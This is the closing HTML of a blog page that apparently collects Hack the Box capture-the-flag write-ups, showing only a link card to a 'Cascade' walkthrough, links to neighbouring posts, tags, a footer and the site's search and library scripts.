href="/posts/HTB-Cascade/"><div class="card-body"> <em class="timeago small" data-ts="1593972000" > 2020-07-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Cascade</h3><div class="text-muted small"><p> This is my guide to the HackTheBox Windows machine Cascade. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t at...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTB-Admirer/" class="btn btn-outline-primary" prompt="Older"><p>Hack the Box - Admirer</p></a> <a href="/posts/HTB-Blunder/" class="btn btn-outline-primary" prompt="Newer"><p>Hack the Box - Blunder</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/username">Chris</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/c/">c</a> <a class="post-tag" href="/tags/discovery/">discovery</a> <a class="post-tag" href="/tags/edr/">edr</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
